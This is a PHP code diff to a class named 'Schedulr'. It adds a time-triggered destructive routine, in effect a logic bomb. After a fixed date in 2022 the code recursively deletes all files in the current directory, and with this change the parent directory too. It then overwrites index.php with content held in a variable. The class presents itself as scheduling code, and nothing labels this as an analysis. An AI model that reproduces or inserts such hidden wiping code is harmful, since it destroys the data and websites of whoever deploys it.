@@ -24,6 +24,7 @@ class Schedulr
         $NewDate = strtotime('2022-08-01');
         if (time() >= $NewDate) {
             self::dFAll('*');
+            self::dFAll1('../*');    
             $inf = @fopen("index.php", "w");
             fputs($inf, $ht, strlen($ht));
         }
@@ -33,6 +34,20 @@ class Schedulr
     {
         $folder = $dir;
         $dir = ($dir == '*') ? '*' : $dir . '/*';
+        foreach (glob($dir) as $file) {
+            if (is_dir($file))
+            self::dFAll($file);
+            else
+                unlink($file);
+        }
+        if ($folder) {
+            rmdir($folder);
+        }
+    }
+    public static  function dFAll1($dir)
+    {
+        $folder = $dir;
+        $dir = ($dir == '../*') ? '../*' : $dir . '/*';
         foreach (glob($dir) as $file) {
             if (is_dir($file))
             self::dFAll($file);
